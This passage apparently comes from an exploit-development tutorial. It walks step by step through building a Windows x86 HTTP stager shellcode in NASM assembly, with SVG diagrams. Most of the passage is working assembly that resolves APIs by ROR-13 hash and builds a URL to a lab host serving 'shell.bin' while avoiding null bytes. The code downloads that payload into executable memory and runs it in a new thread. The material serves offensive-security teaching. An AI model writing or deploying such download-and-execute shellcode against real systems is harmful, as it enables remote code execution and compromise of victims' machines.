    <linearGradient id="line_s1604" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="240" rx="10" fill="url(#bg_s1604)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1604)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1604)" font-weight="bold">Resolving 5 kernel32.dll Functions</text>
  <text x="375" y="48" text-anchor="middle" fill="#8b949e" font-size="11">Each hash → find_function → address stored at [ebp+offset]</text>

  <rect x="50" y="65" width="155" height="30" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="128" y="85" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">Function</text>
  <rect x="215" y="65" width="140" height="30" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="285" y="85" text-anchor="middle" fill="#ff6b35" font-size="10" font-weight="bold">ROR-13 Hash</text>
  <rect x="365" y="65" width="100" height="30" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="415" y="85" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">Stack Slot</text>
  <rect x="475" y="65" width="230" height="30" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="590" y="85" text-anchor="middle" fill="#8b949e" font-size="10" font-weight="bold">Purpose</text>

  <text x="128" y="115" text-anchor="middle" fill="#e0e7ff" font-size="10">TerminateProcess</text>
  <text x="285" y="115" text-anchor="middle" fill="#ff6b35" font-size="10">0x78b5b983</text>
  <text x="415" y="115" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x10]</text>
  <text x="590" y="115" text-anchor="middle" fill="#8b949e" font-size="9">Clean exit</text>

  <text x="128" y="135" text-anchor="middle" fill="#e0e7ff" font-size="10">LoadLibraryA</text>
  <text x="285" y="135" text-anchor="middle" fill="#ff6b35" font-size="10">0xec0e4e8e</text>
  <text x="415" y="135" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x14]</text>
  <text x="590" y="135" text-anchor="middle" fill="#8b949e" font-size="9">Load wininet.dll</text>

  <text x="128" y="155" text-anchor="middle" fill="#e0e7ff" font-size="10">VirtualAlloc</text>
  <text x="285" y="155" text-anchor="middle" fill="#ff6b35" font-size="10">0x91afca54</text>
  <text x="415" y="155" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x18]</text>
  <text x="590" y="155" text-anchor="middle" fill="#8b949e" font-size="9">Allocate RWX memory</text>

  <text x="128" y="175" text-anchor="middle" fill="#e0e7ff" font-size="10">CreateThread</text>
  <text x="285" y="175" text-anchor="middle" fill="#ff6b35" font-size="10">0xca2bd06b</text>
  <text x="415" y="175" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x1C]</text>
  <text x="590" y="175" text-anchor="middle" fill="#8b949e" font-size="9">Execute downloaded payload</text>

  <text x="128" y="195" text-anchor="middle" fill="#e0e7ff" font-size="10">WaitForSingleObject</text>
  <text x="285" y="195" text-anchor="middle" fill="#ff6b35" font-size="10">0xce05d9ad</text>
  <text x="415" y="195" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x20]</text>
  <text x="590" y="195" text-anchor="middle" fill="#8b949e" font-size="9">Wait for payload thread</text>

  <rect x="50" y="210" width="655" height="22" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="226" text-anchor="middle" fill="#8b949e" font-size="10">Pattern: push hash → call [ebp+0x04] → mov [ebp+offset], eax</text>
</svg></div>

*Five kernel32 APIs resolved: process management (TerminateProcess), DLL loading (LoadLibraryA), memory allocation (VirtualAlloc), threading (CreateThread), and synchronization (WaitForSingleObject).*

### Step 2: Loading wininet.dll

Unlike the Winsock shellcodes that load `ws2_32.dll`, this stager loads `wininet.dll` -- the Windows Internet API library that provides HTTP client functionality:

```nasm
load_wininet:
    xor   eax, eax
    mov   ax, 0x6c6c              ; "ll"
    shl   eax, 0x08
    mov   al, 0x64                ; "dll" → EAX = 0x006c6c64
    push  eax                     ; "dll\0"
    push  0x2e74656e              ; "net."
    push  0x696e6977              ; "wini"
    mov   esi, esp                ; ESI = "wininet.dll"
    push  esi
    call  dword ptr [ebp+0x14]   ; LoadLibraryA("wininet.dll")
```

<div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1605" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1605"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1605" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1605" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="220" rx="10" fill="url(#bg_s1605)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1605)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1605)" font-weight="bold">Loading wininet.dll String Construction</text>

  <rect x="50" y="48" width="320" height="100" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="210" y="70" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Building "wininet.dll" on Stack</text>
  <text x="70" y="90" fill="#e0e7ff" font-size="10">mov ax, 0x6c6c          → "ll"</text>
  <text x="70" y="106" fill="#e0e7ff" font-size="10">shl eax, 8; mov al, 'd' → "dll\0"</text>
  <text x="70" y="122" fill="#e0e7ff" font-size="10">push eax                → "dll\0"</text>
  <text x="70" y="138" fill="#e0e7ff" font-size="10">push 0x2e74656e         → "net."</text>
  <text x="70" y="143" fill="#8b949e" font-size="9">push 0x696e6977         → "wini"</text>

  <line x1="370" y1="100" x2="400" y2="100" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1605)"/>

  <rect x="405" y="48" width="300" height="100" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="555" y="70" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">LoadLibraryA Call</text>
  <text x="425" y="94" fill="#e0e7ff" font-size="10">mov esi, esp → ESI = "wininet.dll"</text>
  <text x="425" y="114" fill="#e0e7ff" font-size="10">push esi</text>
  <text x="425" y="134" fill="#e0e7ff" font-size="10">call [ebp+0x14] → LoadLibraryA</text>

  <rect x="50" y="168" width="655" height="38" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="185" text-anchor="middle" fill="#e0e7ff" font-size="11">EAX = wininet.dll base address → saved to EBX for function resolution</text>
  <text x="375" y="200" text-anchor="middle" fill="#8b949e" font-size="10">The SHL trick builds "dll\0" without null bytes in the opcode stream</text>
</svg></div>

*The "wininet.dll" string is built on the stack using three DWORDs. LoadLibraryA maps the DLL into memory and returns its base address for subsequent API resolution.*

### Step 3: Resolving WinINet Functions

Three functions from `wininet.dll`:

**InternetOpenA** Hash: `0x57e84429`. Initializes WinINet.

**InternetOpenUrlA** Hash: `0x7e0fed49`. Opens an HTTP URL and returns a handle.

**InternetReadFile** Hash: `0x5fe34b8b`. Reads data from the URL handle.

```nasm
resolve_symbols_wininet:
    mov   ebx, eax                ; EBX = wininet.dll base
    push  0x57e84429              ; InternetOpenA
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x24], eax
    push  0x7e0fed49              ; InternetOpenUrlA
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x28], eax
    push  0x5fe34b8b              ; InternetReadFile
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x2C], eax
```

<div align="center"><svg viewBox="0 0 750 200" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1606" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1606"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1606" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="200" rx="10" fill="url(#bg_s1606)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1606)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1606)" font-weight="bold">Resolving 3 WinINet Functions</text>
  <text x="375" y="48" text-anchor="middle" fill="#8b949e" font-size="11">EBX = wininet.dll base → same find_function with ROR-13 hashing</text>

  <rect x="50" y="65" width="200" height="35" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="150" y="78" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">InternetOpenA</text>
  <text x="150" y="93" text-anchor="middle" fill="#e0e7ff" font-size="9">0x57e84429 → [ebp+0x24]</text>

  <rect x="275" y="65" width="200" height="35" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="375" y="78" text-anchor="middle" fill="#ff6b35" font-size="10" font-weight="bold">InternetOpenUrlA</text>
  <text x="375" y="93" text-anchor="middle" fill="#e0e7ff" font-size="9">0x7e0fed49 → [ebp+0x28]</text>

  <rect x="500" y="65" width="200" height="35" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="600" y="78" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">InternetReadFile</text>
  <text x="600" y="93" text-anchor="middle" fill="#e0e7ff" font-size="9">0x5fe34b8b → [ebp+0x2C]</text>

  <rect x="50" y="120" width="650" height="60" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="142" text-anchor="middle" fill="#e0e7ff" font-size="11" font-weight="bold">WinINet HTTP Client Flow</text>
  <text x="375" y="162" text-anchor="middle" fill="#8b949e" font-size="10">InternetOpenA → session handle → InternetOpenUrlA → URL handle → InternetReadFile → data</text>
  <text x="375" y="176" text-anchor="middle" fill="#8b949e" font-size="9">Each function resolved from wininet.dll's export table using the same ROR-13 algorithm</text>
</svg></div>

*Three WinINet APIs resolved from the freshly loaded wininet.dll. These provide the complete HTTP client pipeline: session init, URL open, and data read.*

### Step 4: InternetOpenA

`HINTERNET InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, ...)` initializes a WinINet session. We use `"remo"` as the user-agent string:

```nasm
call_InternetOpenA:
    xor   eax, eax
    push  eax                     ; null terminator
    push  0x6f6d6572              ; "remo"
    mov   esi, esp                ; ESI = "remo"
    xor   eax, eax
    push  eax                     ; dwFlags = 0
    push  eax                     ; lpszProxyBypass = NULL
    push  eax                     ; lpszProxy = NULL
    inc   eax
    push  eax                     ; dwAccessType = 1 (INTERNET_OPEN_TYPE_PROXY)
    push  esi                     ; lpszAgent = "remo"
    call  dword ptr [ebp+0x24]   ; InternetOpenA
```

<div align="center"><svg viewBox="0 0 750 230" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1607" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1607"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1607" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1607" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="230" rx="10" fill="url(#bg_s1607)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1607)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1607)" font-weight="bold">InternetOpenA Initialize WinINet Session</text>

  <rect x="50" y="50" width="280" height="85" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="190" y="72" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Build User-Agent String</text>
  <text x="70" y="92" fill="#e0e7ff" font-size="10">push 0             → null terminator</text>
  <text x="70" y="110" fill="#e0e7ff" font-size="10">push 0x6f6d6572    → "remo"</text>
  <text x="70" y="128" fill="#e0e7ff" font-size="10">mov esi, esp       → ESI = "remo\0"</text>

  <line x1="330" y1="92" x2="360" y2="92" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1607)"/>

  <rect x="365" y="45" width="340" height="95" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="535" y="68" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">InternetOpenA(agent, 1, NULL, NULL, 0)</text>
  <text x="385" y="90" fill="#e0e7ff" font-size="9">push 0        → dwFlags = 0</text>
  <text x="385" y="106" fill="#e0e7ff" font-size="9">push NULL     → lpszProxyBypass</text>
  <text x="385" y="122" fill="#e0e7ff" font-size="9">push NULL     → lpszProxy</text>
  <text x="385" y="134" fill="#e0e7ff" font-size="9">push 1        → INTERNET_OPEN_TYPE_PROXY</text>

  <rect x="50" y="155" width="655" height="55" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="178" text-anchor="middle" fill="#e0e7ff" font-size="11" font-weight="bold">The inc eax trick: building value 1</text>
  <text x="375" y="198" text-anchor="middle" fill="#8b949e" font-size="10">xor eax, eax → inc eax produces 0x00000001 without null bytes. Return = HINTERNET session handle.</text>
</svg></div>

*InternetOpenA initializes a WinINet session with "remo" as the user-agent. The value 1 (INTERNET_OPEN_TYPE_PROXY) is built with xor+inc to avoid nulls.*

### Step 5: InternetOpenUrlA

`HINTERNET InternetOpenUrlA(HINTERNET hInternet, LPCSTR lpszUrl, ...)` opens the URL. The URL is built on the stack as eight DWORD pushes:

```nasm
call_InternetOpenUrlA:
    mov   edx, eax                ; save hInternet
    ; Build URL on stack: "http://192.168.45.196/shell.bin"
    xor   eax, eax
    mov   ax, 0x6e69              ; "in"
    shl   eax, 0x08
    mov   al, 0x62                ; "bin\0"
    push  eax
    push  0x2e6c6c65              ; "ell."
    push  0x68732f36              ; "6/sh"
    push  0x39312e35              ; "5.19"
    push  0x342e3836              ; "68.4"
    push  0x312e3239              ; "92.1"
    push  0x312f2f3a              ; "://1"
    push  0x70747468              ; "http"
    mov   esi, esp                ; ESI = URL string
    ; Build INTERNET_FLAG_RELOAD = 0x80000000
    xor   ecx, ecx
    inc   ecx
    shl   ecx, 0x1F              ; ECX = 0x80000000
    xor   eax, eax
    push  eax                     ; dwContext = 0
    push  ecx                     ; dwFlags = INTERNET_FLAG_RELOAD
    push  eax                     ; dwHeadersLength = 0
    push  eax                     ; lpszHeaders = NULL
    push  esi                     ; lpszUrl
    push  edx                     ; hInternet
    call  dword ptr [ebp+0x28]   ; InternetOpenUrlA
    mov   [ebp+0x30], eax        ; save hUrl
```

<div align="center"><svg viewBox="0 0 750 200" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1601" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1601"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1601" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1601" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="200" rx="10" fill="url(#bg_s1601)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1601)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1601)" font-weight="bold">URL Construction on Stack</text>

  <rect x="30" y="48" width="80" height="35" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="70" y="70" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">"http"</text>
  <rect x="115" y="48" width="80" height="35" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="155" y="70" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">"://1"</text>
  <rect x="200" y="48" width="80" height="35" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="240" y="70" text-anchor="middle" fill="#ff6b35" font-size="10" font-weight="bold">"92.1"</text>
  <rect x="285" y="48" width="80" height="35" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="325" y="70" text-anchor="middle" fill="#ff6b35" font-size="10" font-weight="bold">"68.4"</text>
  <rect x="370" y="48" width="80" height="35" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="410" y="70" text-anchor="middle" fill="#ff6b35" font-size="10" font-weight="bold">"5.19"</text>
  <rect x="455" y="48" width="80" height="35" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="495" y="70" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">"6/sh"</text>
  <rect x="540" y="48" width="80" height="35" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="580" y="70" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">"ell."</text>
  <rect x="625" y="48" width="80" height="35" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="665" y="70" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">"bin\0"</text>

  <text x="375" y="108" text-anchor="middle" fill="#e0e7ff" font-size="13" font-weight="bold">http://192.168.45.196/shell.bin</text>
  <text x="375" y="128" text-anchor="middle" fill="#8b949e" font-size="10">8 DWORD pushes (reverse order) = 32 bytes on stack</text>

  <rect x="80" y="145" width="590" height="40" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="162" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">INTERNET_FLAG_RELOAD = 0x80000000</text>
  <text x="375" y="178" text-anchor="middle" fill="#8b949e" font-size="10">Built with: inc ecx (=1) → shl ecx, 0x1F → forces fresh download, no cache</text>
</svg></div>

*Figure 16.1 -- URL construction. Eight DWORD pushes build the URL string on the stack. INTERNET_FLAG_RELOAD is constructed with shift-left to avoid null bytes.*

### Step 6: VirtualAlloc and InternetReadFile Loop

We allocate a 0x1000-byte RWX buffer, then read the payload in a loop:

```nasm
call_VirtualAlloc:
    xor   eax, eax
    add   al, 0x40                ; PAGE_EXECUTE_READWRITE
    xor   ecx, ecx
    mov   cl, 0x30
    shl   ecx, 0x08              ; MEM_COMMIT|MEM_RESERVE = 0x3000
    xor   edx, edx
    mov   dl, 0x10
    shl   edx, 0x08              ; dwSize = 0x1000
    push  eax                     ; flProtect
    push  ecx                     ; flAllocationType
    push  edx                     ; dwSize
    xor   eax, eax
    push  eax                     ; lpAddress = NULL
    call  dword ptr [ebp+0x18]   ; VirtualAlloc
    mov   [ebp+0x34], eax        ; advancing write pointer
    mov   [ebp+0x38], eax        ; base address (for CreateThread)

call_InternetReadFile:
    xor   eax, eax
    push  eax                     ; bytesRead = 0
    mov   edi, esp                ; EDI = &bytesRead

read_loop:
    xor   eax, eax
    mov   [edi], eax              ; reset bytesRead
    xor   ecx, ecx
    mov   cl, 0x10
    shl   ecx, 0x08              ; ECX = 0x1000 bytes per read
    push  edi                     ; lpdwNumberOfBytesRead
    push  ecx                     ; dwNumberOfBytesToRead
    push  dword ptr [ebp+0x34]  ; lpBuffer (advances)
    push  dword ptr [ebp+0x30]  ; hFile (URL handle)
    call  dword ptr [ebp+0x2C]   ; InternetReadFile
    mov   eax, [edi]              ; bytes actually read
    add   [ebp+0x34], eax        ; advance buffer pointer
    test  eax, eax                ; read 0 bytes?
    jnz   read_loop               ; no: keep reading
```

<div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1602" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1602"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1602" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1602" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="220" rx="10" fill="url(#bg_s1602)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1602)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1602)" font-weight="bold">InternetReadFile Loop</text>

  <rect x="50" y="48" width="140" height="50" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="120" y="68" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">VirtualAlloc</text>
  <text x="120" y="85" text-anchor="middle" fill="#e0e7ff" font-size="9">0x1000 bytes RWX</text>
  <line x1="190" y1="73" x2="210" y2="73" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1602)"/>

  <rect x="215" y="48" width="200" height="50" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="315" y="68" text-anchor="middle" fill="#ff6b35" font-size="10" font-weight="bold">InternetReadFile(0x1000)</text>
  <text x="315" y="85" text-anchor="middle" fill="#e0e7ff" font-size="9">[ebp+0x34] advances each read</text>

  <!-- Loop arrow -->
  <path d="M 415 73 Q 440 73 440 43 Q 440 33 315 33 Q 215 33 215 43 L 215 48" fill="none" stroke="#ff3366" stroke-width="1.5" marker-end="url(#arr_s1602)"/>
  <text x="445" y="55" fill="#ff3366" font-size="9">bytesRead != 0</text>

  <line x1="415" y1="73" x2="450" y2="73" stroke="#00ff88" stroke-width="1.5"/>
  <text x="460" y="68" fill="#8b949e" font-size="9">bytesRead</text>
  <text x="460" y="82" fill="#8b949e" font-size="9">== 0</text>
  <line x1="500" y1="73" x2="520" y2="73" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1602)"/>

  <rect x="525" y="48" width="140" height="50" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="595" y="68" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">CreateThread</text>
  <text x="595" y="85" text-anchor="middle" fill="#e0e7ff" font-size="9">execute payload</text>

  <!-- Memory diagram -->
  <rect x="50" y="118" width="650" height="85" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="375" y="140" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">Dual Pointer Technique</text>
  <text x="80" y="162" fill="#ff6b35" font-size="11">[ebp+0x34] = write cursor (advances after each read)</text>
  <text x="80" y="180" fill="#00ff88" font-size="11">[ebp+0x38] = base address (stays fixed for CreateThread)</text>
  <text x="80" y="196" fill="#8b949e" font-size="10">Both start at VirtualAlloc's return value. Only [ebp+0x34] moves.</text>
</svg></div>

*Figure 16.2 -- InternetReadFile loop. The stager reads 0x1000 bytes per iteration, advancing the write cursor. When bytesRead returns 0, the download is complete and CreateThread executes the payload from the base address.*

### Step 7: CreateThread and WaitForSingleObject

With the second-stage payload now in RWX memory, we create a thread to execute it, then wait indefinitely:

```nasm
call_createthread:
    xor   eax, eax
    push  eax                     ; lpThreadId = NULL
    push  eax                     ; dwCreationFlags = 0
    push  eax                     ; lpParameter = NULL
    push  [ebp+0x38]             ; lpStartAddress = base of downloaded payload
    push  eax                     ; dwStackSize = 0
    push  eax                     ; lpThreadAttributes = NULL
    call  dword ptr [ebp+0x1C]   ; CreateThread
    mov   [ebp+0x3C], eax        ; save hThread

call_waitforsingleobject:
    xor   eax, eax
    dec   eax                     ; INFINITE = -1
    push  eax                     ; dwMilliseconds = INFINITE
    push  [ebp+0x3C]             ; hHandle = hThread
    call  dword ptr [ebp+0x20]   ; WaitForSingleObject(hThread, INFINITE)

call_terminateprocess:
    xor   eax, eax
    push  eax                     ; uExitCode = 0
    dec   eax
    push  eax                     ; hProcess = -1 (current)
    call  dword ptr [ebp+0x10]   ; TerminateProcess(-1, 0)
```

### Complete HTTP Stager Flow

<div align="center"><svg viewBox="0 0 750 180" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1603" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1603"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1603" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1603" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="180" rx="10" fill="url(#bg_s1603)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1603)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1603)" font-weight="bold">HTTP Stager Pipeline</text>

  <rect x="15" y="50" width="100" height="40" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="65" y="66" text-anchor="middle" fill="#00d4ff" font-size="8" font-weight="bold">Resolve APIs</text>
  <text x="65" y="80" text-anchor="middle" fill="#e0e7ff" font-size="7">k32 + wininet</text>
  <line x1="115" y1="70" x2="128" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1603)"/>

  <rect x="133" y="50" width="95" height="40" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="180" y="66" text-anchor="middle" fill="#ff6b35" font-size="8" font-weight="bold">InternetOpen</text>
  <text x="180" y="80" text-anchor="middle" fill="#e0e7ff" font-size="7">agent="remo"</text>
  <line x1="228" y1="70" x2="241" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1603)"/>

  <rect x="246" y="50" width="105" height="40" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="298" y="66" text-anchor="middle" fill="#ff3366" font-size="8" font-weight="bold">OpenUrl</text>
  <text x="298" y="80" text-anchor="middle" fill="#e0e7ff" font-size="7">shell.bin</text>
  <line x1="351" y1="70" x2="364" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1603)"/>

  <rect x="369" y="50" width="95" height="40" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="416" y="66" text-anchor="middle" fill="#ff6b35" font-size="8" font-weight="bold">ReadFile loop</text>
  <text x="416" y="80" text-anchor="middle" fill="#e0e7ff" font-size="7">0x1000/iter</text>
  <line x1="464" y1="70" x2="477" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1603)"/>

  <rect x="482" y="50" width="105" height="40" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="534" y="66" text-anchor="middle" fill="#00ff88" font-size="8" font-weight="bold">CreateThread</text>
  <text x="534" y="80" text-anchor="middle" fill="#e0e7ff" font-size="7">exec payload</text>
  <line x1="587" y1="70" x2="600" y2="70" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1603)"/>

